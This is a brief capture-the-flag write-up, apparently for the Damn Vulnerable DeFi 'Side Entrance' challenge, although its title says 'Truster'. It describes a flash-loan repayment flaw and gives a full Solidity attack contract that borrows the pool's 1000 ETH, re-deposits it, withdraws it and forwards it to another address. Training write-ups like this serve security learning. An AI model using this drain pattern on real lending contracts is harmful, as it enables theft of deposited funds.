# Truster CTF Writeup

## Challenge Description
A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.

It has 1000 ETH in balance already, and is offering free flashloans using the deposited ETH to promote their system.

Yoy start with 1 ETH in balance. Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.



## The Exploit Strategy
There is a contract called SideEntranceLenderPool.sol. in SideEntranceLenderPool.sol there is a vuln in flashloan function ,the function is not checking whether flashloan repayment was transfered or deposited. 

The attack strategy revolves around getting flash on maximum eth in and depositing same eth in pool via execute function  and after the flashlon we can transfer to recovery address.


## Solution
```solidity
contract Attack {
    address recovery;
    SideEntranceLenderPool public pool;

    constructor(SideEntranceLenderPool _challenge, address _recovery) {
        pool = _challenge;
        recovery = _recovery;
    }

    function attack() public {
        pool.flashLoan(1000e18);
        pool.withdraw();
        (bool result, ) = payable(recovery).call{value: 1000e18}("");
        require(result, "Transfer failed");
    }

    function execute() external payable {
        pool.deposit{value:1000e18 }();
    }
    receive() external payable {}
}
```

## References
- [Solution Link](https://docs.soliditylang.org/)
- [Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/)
